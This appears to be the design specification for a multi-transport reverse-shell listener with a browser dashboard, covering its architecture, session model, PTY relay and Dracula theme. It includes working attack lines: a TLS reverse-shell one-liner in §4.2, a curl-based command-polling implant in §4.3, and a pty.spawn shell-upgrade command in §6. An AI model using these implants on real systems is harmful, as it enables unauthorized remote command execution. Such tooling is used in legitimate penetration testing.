# Reverse Shell Listener — v2 Specification

A single-host, multi-session reverse-shell catcher with a browser dashboard.
Complete rewrite of the original AngularJS / jQuery.terminal / Bootstrap 3 app.

- **Backend:** Node.js + Express 5 + `express-ws`, no build step.
- **Frontend:** [`@nemanjan00/qrp`](https://github.com/nemanjan00/qrp) (data-first
  reactive framework) + [`@xterm/xterm`](https://xtermjs.org) for the terminal,
  bundled with **esbuild** (`src/app.js` + `theme.css` → `public/dist/`). No
  webpack, no Angular.
- **Transports:** three ways for a target to call home — **raw TCP**,
  **TLS-wrapped TCP**, and **HTTP webshell** — all handled by the same process
  that serves the dashboard.
- **PTY:** the browser side is a full VT emulator; the relay is binary-clean and
  forwards terminal resize, so an upgraded remote shell behaves like a real TTY.
- **Look:** [Dracula](https://draculatheme.com) everywhere — the xterm terminal
  uses the canonical Dracula palette, the rest of the UI is a flat, dark,
  Dracula-inspired theme.

---

## 1. Goals & non-goals

### Goals
1. Catch reverse shells over three independent transports on one host/process.
2. Present every live and dead session in one dashboard; attach to any of them
   in a real terminal emulator.
3. Full interactive PTY experience: raw byte passthrough both directions,
   `SIGWINCH` (resize) forwarding, and a one-click **shell upgrade** helper that
   turns a dumb `sh` into a PTY-backed `bash`.
4. Zero front-end build step. Everything runs from vendored ES modules.
5. Cohesive Dracula aesthetic.

### Non-goals
- Multi-user access control / RBAC. v2 has a single shared credential
  (HTTP Basic Auth, see §9); running behind a firewall / VPN / SSH tunnel is
  still recommended.
- Persisting sessions across process restarts (scrollback is in-memory only).
- Payload generation UI beyond documenting copy-paste one-liners.

---

## 2. High-level architecture

```
                          ┌───────────────────────── one Node process ──────────────────────────┐
  target (raw)  ─TCP────▶ │  transports/tcp.js      ┐                                             │
  target (tls)  ─TLS────▶ │  transports/tls.js      ├─▶  core/registry.js  (Session registry)     │
  target (web)  ─HTTP───▶ │  transports/webshell.js ┘         │  emits: add / update / remove      │
                          │                                    │                                    │
  browser  ◀─WS binary──▶ │  api/ws.js  ◀── relays raw bytes + control frames ──────────┘          │
  browser  ◀─WS json ───▶ │  api/ws.js  (session-list event stream)                                │
  browser  ◀─HTTP───────▶ │  api/rest.js (list / kill / upgrade) + static public/                  │
                          └──────────────────────────────────────────────────────────────────────┘
```

The **Session** is the central abstraction. Every transport, however it moves
bytes, adapts its connection to one `Session` interface. The dashboard and the
WS relay only ever talk to `Session`s — they don't know or care which transport
produced them.

---

## 3. The Session abstraction

`core/session.js` exports a `Session` class (extends `EventEmitter`).

| Field        | Type      | Notes                                                        |
|--------------|-----------|-------------------------------------------------------------|
| `id`         | string    | short unique id (`s1`, `s2`, …)                             |
| `transport`  | string    | `"tcp"` \| `"tls"` \| `"webshell"`                          |
| `remote`     | string    | remote `ip:port` (or `ip` for webshell)                     |
| `createdAt`  | number    | epoch ms                                                    |
| `alive`      | boolean   | false once the connection is gone                          |
| `cols/rows`  | number    | last known terminal size (default 80×24)                   |
| `scrollback` | Buffer[]  | capped ring buffer of all output bytes (for late attach)   |

| Method / event         | Direction        | Purpose                                            |
|------------------------|------------------|----------------------------------------------------|
| `write(buf)`           | dash → target    | send stdin bytes to the remote shell               |
| `resize(cols, rows)`   | dash → target    | record size; transport forwards if it can          |
| `close()`              | dash → target    | tear the connection down                           |
| `event "data" (buf)`   | target → dash    | raw output bytes                                    |
| `event "exit"`         | target → dash    | connection ended (sets `alive=false`)              |

Each transport constructs a `Session`, wires the underlying connection to
`write`/`resize`/`close`, pushes inbound bytes via `emit("data", buf)`, and
registers it with the registry. Scrollback is appended on every `data` so a
browser that attaches late (or a second viewer) gets the full history.

`core/registry.js` keeps the `Map<id, Session>`, assigns ids, re-emits
`add` / `update` / `remove` for the WS session-list stream, and offers
`list()`, `get(id)`, `remove(id)`.

---

## 4. Transports

All three are started by `server.js` on the same host. Ports and toggles come
from `config.js` (env-overridable).

### 4.1 Raw TCP — `transports/tcp.js`
- `net.createServer` on `TCP_PORT` (default **1337**).
- `socket.on("data")` → `session.emit("data")`; `session.write` → `socket.write`.
- `resize`: for a raw socket there is no out-of-band channel, so resize is
  recorded and applied to the remote only after **upgrade** (we then inject
  `stty rows R cols C`).
- `close`/`error`/`end` → `session.markExit()`.

### 4.2 TLS-wrapped TCP — `transports/tls.js`
- `tls.createServer({ cert, key }, …)` on `TLS_PORT` (default **1338**).
- Identical byte handling to TCP; the socket is just encrypted.
- **Certificate:** on boot, if `certs/server.crt` / `certs/server.key` are
  missing, generate a self-signed pair (`tls/generate-cert.js`, via `openssl` if
  present, else Node `crypto` X.509). Fingerprint is logged so the payload can
  pin it. The target connects with e.g.
  `mkfifo /tmp/f; /bin/sh -i </tmp/f 2>&1 | openssl s_client -quiet -connect HOST:1338 >/tmp/f`.

### 4.3 HTTP webshell — `transports/webshell.js`
A firewall-friendly transport for targets that can only make outbound HTTP(S)
requests. The implant **beacons** to the same Express server; there is no raw
socket. Mounted under `/webshell/*` on the shared app:

| Endpoint                         | Method | Purpose                                                        |
|----------------------------------|--------|---------------------------------------------------------------|
| `/webshell/register`             | GET    | server mints a session id, returns it as text                 |
| `/webshell/:id/poll`             | GET    | **long-poll** (holds ≤25 s) for queued stdin; returns bytes   |
| `/webshell/:id/output`           | POST   | implant posts raw command output (`--data-binary`)            |

- `session.write(buf)` enqueues bytes; a held `poll` resolves immediately, else
  the next poll drains the queue.
- `alive` flips false when no poll/output is seen within `WEBSHELL_TIMEOUT`
  (default 30 s); a later beacon revives it.
- **PTY caveat:** HTTP request/response is half-duplex and command-oriented, so
  the webshell is line/command interactive, not a true raw PTY. Output still
  renders with full ANSI in xterm; `resize`/`upgrade` are no-ops here. tcp/tls
  are the full-PTY transports.
- Reference bash implant (documented in README):
  ```sh
  H=http://HOST:8080; ID=$(curl -s $H/webshell/register)
  while :; do C=$(curl -s $H/webshell/$ID/poll); [ -n "$C" ] && \
    O=$(printf '%s' "$C" | sh 2>&1); curl -s --data-binary "$O" $H/webshell/$ID/output; done
  ```

---

## 5. Browser ↔ server API (all on the same Express server & port)

**Non-negotiable:** there is exactly one HTTP server, created by `app.listen()`,
and `express-ws(app)` attaches the WebSocket upgrade handler to *that same
server*. The dashboard, REST API, static assets, the webshell transport, and
both WebSocket endpoints all share **one host and one port** (`PORT`, default
**8080**). No separate WS/socket.io server, no second port for the UI.

### 5.1 REST — `api/rest.js`
| Endpoint                    | Method | Purpose                          |
|-----------------------------|--------|----------------------------------|
| `/api/sessions`             | GET    | JSON snapshot of all sessions    |
| `/api/sessions/:id`         | GET    | one session's metadata           |
| `/api/sessions/:id/kill`    | POST   | `session.close()`                |
| `/api/sessions/:id/upgrade` | POST   | inject the PTY-upgrade sequence  |

### 5.2 WebSocket — `api/ws.js` (registered with `app.ws(...)`)
- **`/api/ws/sessions`** — session-list event stream. On connect: a `snapshot`
  of all sessions, then `add` / `update` / `remove` JSON events from the
  registry. Text/JSON frames.
- **`/api/ws/session/:id`** — the terminal channel for one session:
  - On connect the server replays `scrollback` as binary frames.
  - **Binary frames** = raw bytes. server→browser = shell output;
    browser→server = stdin (`session.write`).
  - **Text/JSON frames** = control: `{type:"resize",cols,rows}`,
    `{type:"upgrade"}`. This keeps the byte stream 8-bit clean for the PTY.

---

## 6. PTY support

"Full PTY" on the listener means an end-to-end raw, resize-aware pipe plus a way
to give the *remote* side a real TTY:

1. **Binary-clean relay** — bytes are never transformed to strings on the path
   target ↔ socket ↔ ws ↔ xterm. ANSI, control chars, and colors pass through.
2. **xterm.js** is a full VT100/VT220 emulator — it *is* the terminal.
3. **Resize forwarding** — the `FitAddon` measures the container; `onResize`
   sends `{type:"resize"}`; the session records it and, on tcp/tls, injects
   `stty rows R cols C` after upgrade.
4. **Shell upgrade helper** — the classic dumb-shell→PTY dance, one click:
   ```
   python3 -c 'import pty;pty.spawn("/bin/bash")'   (or python/script fallback)
   ```
   followed by pushing the current `stty` size. After this the remote runs a
   PTY-backed bash and job control / full-screen apps (vim, top) work.

---

## 7. Frontend (qrp + xterm, esbuild bundle)

Source lives in `src/`; esbuild bundles it to `public/dist/`:

```
esbuild src/app.js --bundle --format=esm --outfile=public/dist/app.js
        --loader:.css=css   (xterm.css + theme.css → public/dist/app.css)
```

`build.js` runs this (with `--watch` in dev). `public/index.html` just loads the
built bundle:

```html
<link rel="stylesheet" href="/dist/app.css">
<script type="module" src="/dist/app.js"></script>
```

- `src/app.js` — qrp application (imports `@nemanjan00/qrp`, `@xterm/xterm`,
  `@xterm/addon-fit`, `@xterm/xterm/css/xterm.css`, and `./theme.css`):
  - reactive `state({ sessions: [], currentId: null })`.
  - `/api/ws/sessions` keeps `sessions` in sync (add/update/remove).
  - **Sidebar** built with qrp `list()`: live sessions and dead sessions,
    keyed by `id`, showing transport badge + `remote #id`. Click → select.
  - **Terminal pane**: on select, open a WebSocket to
    `/api/ws/session/:id`, mount an xterm instance (Dracula theme + FitAddon),
    pipe binary both ways, wire `onData`→ws and ws→`term.write`, `onResize`→
    control frame. Reuse/teardown cleanly on switch (`onDispose`).
  - **Toolbar**: transport label, remote, Upgrade button, Kill button,
    connection status dot.
- qrp sharp-edges honored: reactive children are thunks (`() => …`); `list`
  source is a thunk with unique string keys; ws/xterm lifetimes bound with
  `onDispose`; DOM nodes created once per identity.

---

## 8. Theme — Dracula

`public/styles/theme.css` defines the palette as CSS custom properties and
maps qrp's tokens (`--qrp-bg`, `--qrp-surface`, `--qrp-fg`, `--qrp-accent`, …)
onto it. `data-theme="dark"` is forced on `<html>`.

| Token        | Hex       | Use                         |
|--------------|-----------|-----------------------------|
| background   | `#282a36` | app bg / xterm bg           |
| current line | `#44475a` | surfaces, selection, hover  |
| foreground   | `#f8f8f2` | text / xterm fg             |
| comment      | `#6272a4` | muted text, borders         |
| purple       | `#bd93f9` | primary accent              |
| pink         | `#ff79c6` | secondary accent            |
| green        | `#50fa7b` | alive / success             |
| red          | `#ff5555` | dead / danger (kill)        |
| cyan         | `#8be9fd` | links / info                |
| orange       | `#ffb86c` | warnings / tls badge        |
| yellow       | `#f1fa8c` | highlights                  |

Design language: flat (no gradients/heavy shadows), rounded-`--qrp-radius`
surfaces, thin `comment`-colored borders, monospace accents. The xterm terminal
gets the canonical 16-color Dracula ANSI palette. Transport badges are
color-coded: tcp=purple, tls=orange, webshell=cyan.

---

## 9. Configuration & security

`config.js` (all env-overridable): `PORT=8080`, `TCP_PORT=1337`,
`TLS_PORT=1338`, `SCROLLBACK_BYTES=1048576`, `WEBSHELL_TIMEOUT=30000`,
`WEBSHELL_POLL_MS=25000`, `ENABLE_TCP/TLS/WEBSHELL=true`,
`AUTH_USER`, `AUTH_PASS`.

**Auth:** the dashboard, REST API and both WebSocket endpoints are guarded by
HTTP Basic Auth (`api/auth.js`, constant-time compare) when `AUTH_USER` and
`AUTH_PASS` are set. With either unset the server logs a loud warning and runs
open. The `/webshell/*` beacon endpoints are deliberately exempt — the implant
is a dumb curl loop on the target and must not carry dashboard credentials.

**Security:** the dashboard grants shell access to every caught session, so even
with Basic Auth it should not face the public internet. Run it bound to
localhost behind an SSH tunnel or on a trusted VPN. Only the reverse-shell
listener ports (tcp/tls) and, if used, the webshell HTTP path need to be
reachable by targets.

---

## 10. File layout

```
server.js                 entry: express app, express-ws, static, wires it all
config.js                 env-driven config
core/registry.js          session registry + event bus
core/session.js           Session class
transports/tcp.js         raw TCP listener
transports/tls.js         TLS listener
transports/webshell.js    HTTP beacon transport (Express router)
tls/generate-cert.js      self-signed cert bootstrap
api/rest.js               REST router
api/ws.js                 express-ws endpoints (session list + terminal)
build.js                  esbuild bundler (build / --watch)
src/app.js                qrp application (source)
src/theme.css             Dracula theme (source)
public/index.html         HTML shell, loads /dist bundle
public/dist/*             esbuild output (app.js, app.css) — gitignored
README.md                 usage, payloads, security notes
```

## 11. Removed from v1

AngularJS, angular-terminal, angular-websocket, jQuery, jQuery.terminal,
Bootstrap 3, font-awesome, webpack + loaders, live-reload, pm2 bootstrap
(`pm2.js`), the old `entry.js` / `controllers/` / `routes/` / `style/`, and the
line-buffered, string-based single-TCP relay. Replaced by the above.
